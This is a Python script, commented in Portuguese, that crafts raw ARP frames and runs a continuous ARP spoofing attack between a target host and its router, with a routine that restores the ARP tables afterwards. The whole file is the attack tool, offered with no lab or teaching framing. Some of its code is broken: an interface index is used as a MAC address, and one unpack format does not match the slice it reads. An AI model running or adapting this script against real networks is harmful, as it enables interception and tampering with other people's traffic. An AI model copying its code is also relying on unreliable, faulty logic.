import socket
import struct
import time
import threading

def criar_pacote_arp(src_mac, src_ip, dst_mac, dst_ip, opcode):
    """Cria um pacote ARP Ethernet com o opcode especificado."""
    eth_header = struct.pack(
        "!6s6sH",
        bytes.fromhex(dst_mac.replace(":", "")),  # MAC de destino
        bytes.fromhex(src_mac.replace(":", "")),  # MAC de origem
        0x0806,  # Tipo EtherType ARP
    )
    arp_header = struct.pack(
        "!HHBBH6s4s6s4s",
        1,  # Tipo de hardware (Ethernet)
        0x0800,  # Protocolo (IPv4)
        6,  # Tamanho do endereço MAC
        4,  # Tamanho do endereço IP
        opcode,  # Opcode (1 para request, 2 para reply)
        bytes.fromhex(src_mac.replace(":", "")),  # MAC do remetente
        socket.inet_aton(src_ip),  # IP do remetente
        bytes.fromhex(dst_mac.replace(":", "")),  # MAC do destino
        socket.inet_aton(dst_ip),  # IP do destino
    )
    return eth_header + arp_header

def obter_mac(interface, ip):
    """Obtém o endereço MAC para um IP usando uma solicitação ARP."""
    s = socket.socket(socket.AF_PACKET, socket.SOCK_RAW, socket.ntohs(0x0003))
    s.bind((interface, 0))
    arp_request = criar_pacote_arp(
        src_mac="00:11:22:33:44:55", src_ip="0.0.0.0", 
        dst_mac="ff:ff:ff:ff:ff:ff", dst_ip=ip, opcode=1
    )
    s.send(arp_request)

    while True:
        packet = s.recvfrom(65536)[0]
        eth_type = struct.unpack("!H", packet[12:14])[0]
        
        if eth_type == 0x0806:  # ARP
            if len(packet) >= 42:  # Verifica tamanho mínimo esperado
                arp_data = packet[14:42]
                _, _, _, _, mac, ip_resp = struct.unpack("!HHBBH6s4s", arp_data)
                if socket.inet_ntoa(ip_resp) == ip:
                    return ":".join("{:02x}".format(b) for b in mac)
        else:
            continue

def arp_spoof(interface, alvo_ip, roteador_ip):
    """Executa ARP Spoofing entre o alvo e o roteador."""
    alvo_mac = obter_mac(interface, alvo_ip)
    roteador_mac = obter_mac(interface, roteador_ip)

    atacante_mac = socket.if_nametoindex(interface)
    print("[INFO] Iniciando ARP Spoofing...")

    pacote_para_alvo = criar_pacote_arp(atacante_mac, roteador_ip, alvo_mac, alvo_ip, 2)
    pacote_para_roteador = criar_pacote_arp(atacante_mac, alvo_ip, roteador_mac, roteador_ip, 2)

    try:
        while True:
            s = socket.socket(socket.AF_PACKET, socket.SOCK_RAW)
            s.bind((interface, 0))
            s.send(pacote_para_alvo)
            s.send(pacote_para_roteador)
            time.sleep(2)
    except KeyboardInterrupt:
        restaurar_arp(interface, alvo_ip, roteador_ip, alvo_mac, roteador_mac)

def restaurar_arp(interface, alvo_ip, roteador_ip, alvo_mac, roteador_mac):
    """Restaura as tabelas ARP ao estado original."""
    atacante_mac = socket.if_nametoindex(interface)
    pacote_para_alvo = criar_pacote_arp(roteador_mac, roteador_ip, alvo_mac, alvo_ip, 2)
    pacote_para_roteador = criar_pacote_arp(alvo_mac, alvo_ip, roteador_mac, roteador_ip, 2)

    s = socket.socket(socket.AF_PACKET, socket.SOCK_RAW)
    s.bind((interface, 0))
    for _ in range(5):
        s.send(pacote_para_alvo)
        s.send(pacote_para_roteador)
        time.sleep(1)

    print("[INFO] Tabelas ARP restauradas.")
